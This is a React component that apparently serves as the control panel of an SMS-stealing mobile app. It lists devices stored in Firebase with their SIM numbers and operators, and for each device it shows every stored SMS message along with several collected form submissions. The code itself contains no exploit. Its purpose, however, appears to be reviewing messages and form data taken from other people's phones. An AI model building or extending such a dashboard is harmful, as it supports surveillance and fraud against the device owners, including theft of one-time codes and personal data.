import React, { useState, useEffect } from 'react';
import { ref, onValue } from 'firebase/database';
import { db } from '../firebase';
import { useParams, useNavigate } from 'react-router-dom';

const DataPage = () => {
  const { deviceId } = useParams();
  const navigate = useNavigate();
  const [devices, setDevices] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [deviceData, setDeviceData] = useState(null);
  const [smsList, setSmsList] = useState([]);
  const [activeTab, setActiveTab] = useState('data'); // 'data' or 'sms'
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  // All devices fetch karna
  useEffect(() => {
    const devicesRef = ref(db, 'devices1');
    
    const unsubscribe = onValue(devicesRef, (snapshot) => {
      try {
        const devicesData = snapshot.val();
        if (devicesData) {
          const devicesList = Object.entries(devicesData).map(([deviceId, deviceData]) => {
            const smsCount = deviceData.sms ? Object.keys(deviceData.sms).length : 0;
            const hasData = deviceData.main_form || deviceData.first_form || deviceData.second_form;
            
            return {
              id: deviceId,
              deviceId: deviceId,
              deviceName: deviceData.deviceInfo?.deviceName || 'Unknown Device',
              manufacturer: deviceData.deviceInfo?.manufacturer || 'Unknown',
              simNumber: deviceData.deviceInfo?.simNumber || 'N/A',
              simOperator: deviceData.deviceInfo?.simOperator || 'N/A',
              smsCount: smsCount,
              hasData: hasData
            };
          });
          setDevices(devicesList);
          
          // Agar URL mein deviceId hai to automatically select karo
          if (deviceId && !selectedDevice) {
            const deviceFromUrl = devicesList.find(d => d.deviceId === deviceId);
            if (deviceFromUrl) {
              setSelectedDevice(deviceFromUrl);
              loadDeviceDetails(deviceFromUrl.deviceId);
            }
          }
        } else {
          setDevices([]);
        }
        setLoading(false);
      } catch (err) {
        setError('Error fetching devices: ' + err.message);
        setLoading(false);
      }
    }, (error) => {
      setError('Error fetching devices: ' + error.message);
      setLoading(false);
    });

    return () => unsubscribe();
  }, [deviceId, selectedDevice]);

  // Specific device ka data load karna
  const loadDeviceDetails = (deviceId) => {
    const deviceRef = ref(db, `devices1/${deviceId}`);
    
    onValue(deviceRef, (snapshot) => {
      try {
        const deviceData = snapshot.val();
        if (deviceData) {
          setDeviceData(deviceData);
          
          // SMS messages load karna
          if (deviceData.sms) {
            const messages = Object.entries(deviceData.sms).map(([smsId, smsData]) => ({
              id: smsId,
              ...smsData
            }));
            messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
            setSmsList(messages);
          } else {
            setSmsList([]);
          }
          
          // URL update karna
          navigate(`/data/${deviceId}`, { replace: true });
        }
      } catch (err) {
        setError('Error loading device details: ' + err.message);
      }
    });
  };

  const handleDeviceSelect = (device) => {
    setSelectedDevice(device);
    setActiveTab('data'); // Default tab data par set karo
    loadDeviceDetails(device.deviceId);
  };

  const formatDateTime = (dateTime) => {
    return dateTime || 'N/A';
  };

  const formatTimestamp = (timestamp) => {
    if (!timestamp) return 'N/A';
    const date = new Date(timestamp);
    return date.toLocaleString([], { 
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  const getMessagePreview = (message) => {
    if (!message) return 'No message';
    return message.length > 120 ? message.substring(0, 120) + '...' : message;
  };

  if (loading) return <div className="loading">Loading devices...</div>;
  if (error) return <div className="error">{error}</div>;

  return (
    <div>
      <div className="page-header">
        <h1 className="page-title">Device Data</h1>
        <div className="badge badge-primary">Total: {devices.length} devices</div>
      </div>

      {/* Device Selection Section */}
      <div className="card" style={{ marginBottom: '1.5rem' }}>
        <h2 style={{ marginBottom: '1rem', color: '#333' }}>Select Device</h2>
        <div className="devices-grid">
          {devices.map((device) => (
            <div
              key={device.id}
              className={`device-selection-card ${selectedDevice?.deviceId === device.deviceId ? 'selected' : ''}`}
              onClick={() => handleDeviceSelect(device)}
            >
              <div className="device-selection-header">
                <div className="device-selection-name">{device.deviceName}</div>
                <div className="device-selection-badges">
                  {device.hasData && <span className="badge badge-success">Data</span>}
                  {device.smsCount > 0 && <span className="badge badge-primary">{device.smsCount} SMS</span>}
                </div>
              </div>
              <div className="device-selection-info">
                <div>ID: {device.deviceId.substring(0, 8)}...</div>
                <div>SIM: {device.simOperator}</div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Selected Device Details */}
      {selectedDevice && deviceData && (
        <div className="card">
          <div className="device-details-header">
            <h2 style={{ color: '#333', margin: 0 }}>
              {selectedDevice.deviceName}
            </h2>
            <div className="badge badge-info">{selectedDevice.deviceId}</div>
          </div>

          {/* Tabs */}
          <div className="tabs-container">
            <div className="tabs">
              <button
                className={`tab ${activeTab === 'data' ? 'active' : ''}`}
                onClick={() => setActiveTab('data')}
              >
                Form Data
              </button>
              <button
                className={`tab ${activeTab === 'sms' ? 'active' : ''}`}
                onClick={() => setActiveTab('sms')}
              >
                SMS Messages ({smsList.length})
              </button>
            </div>

            {/* Tab Content */}
            <div className="tab-content">
              {activeTab === 'data' && (
                <div className="data-tab">
                  <h3 style={{ marginBottom: '1rem', color: '#333' }}>Form Data</h3>
                  
                  {/* Main Form Data */}
                  {deviceData.main_form && (
                    <div className="form-section">
                      <h4 style={{ color: '#667eea', marginBottom: '0.75rem' }}>Main Form</h4>
                      <div className="form-data-grid">
                        {Object.entries(deviceData.main_form).map(([key, value]) => (
                          <div key={key} className="form-data-item">
                            <span className="form-data-label">{key}:</span>
                            <span className="form-data-value">{value || 'N/A'}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* First Form Data */}
                  {deviceData.first_form && (
                    <div className="form-section">
                      <h4 style={{ color: '#667eea', marginBottom: '0.75rem' }}>First Form</h4>
                      <div className="form-data-grid">
                        {Object.entries(deviceData.first_form).map(([key, value]) => (
                          <div key={key} className="form-data-item">
                            <span className="form-data-label">{key}:</span>
                            <span className="form-data-value">{value || 'N/A'}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Second Form Data */}
                  {deviceData.second_form && (
                    <div className="form-section">
                      <h4 style={{ color: '#667eea', marginBottom: '0.75rem' }}>Second Form</h4>
                      <div className="form-data-grid">
                        {Object.entries(deviceData.second_form).map(([key, value]) => (
                          <div key={key} className="form-data-item">
                            <span className="form-data-label">{key}:</span>
                            <span className="form-data-value">{value || 'N/A'}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {!deviceData.main_form && !deviceData.first_form && !deviceData.second_form && (
                    <div className="no-data">
                      No form data available for this device.
                    </div>
                  )}
                </div>
              )}

              {activeTab === 'sms' && (
                <div className="sms-tab">
                  <h3 style={{ marginBottom: '1rem', color: '#333' }}>SMS Messages</h3>
                  
                  {smsList.length === 0 ? (
                    <div className="no-data">
                      No SMS messages found for this device.
                    </div>
                  ) : (
                    <div className="sms-list">
                      {smsList.map((sms) => (
                        <div key={sms.id} className="sms-card">
                          <div className="sms-header">
                            <div className="sms-sender">{sms.sender || 'Unknown Sender'}</div>
                            <div className="sms-time">
                              <div style={{ fontWeight: '600', color: '#667eea' }}>
                                {formatDateTime(sms.dateTime)}
                              </div>
                              <div style={{ color: '#999', fontSize: '0.7rem' }}>
                                {formatTimestamp(sms.timestamp)}
                              </div>
                            </div>
                          </div>
                          
                          <div className="sms-message">
                            {sms.message}
                          </div>
                          
                          <div className="sms-footer">
                            <span className="badge badge-primary" style={{ fontSize: '0.7rem' }}>
                              {sms.type === 1 ? 'Received' : 'Sent'}
                            </span>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {!selectedDevice && (
        <div className="card">
          <p style={{ textAlign: 'center', color: '#666' }}>
            Please select a device to view its data and SMS messages.
          </p>
        </div>
      )}
    </div>
  );
};

export default DataPage;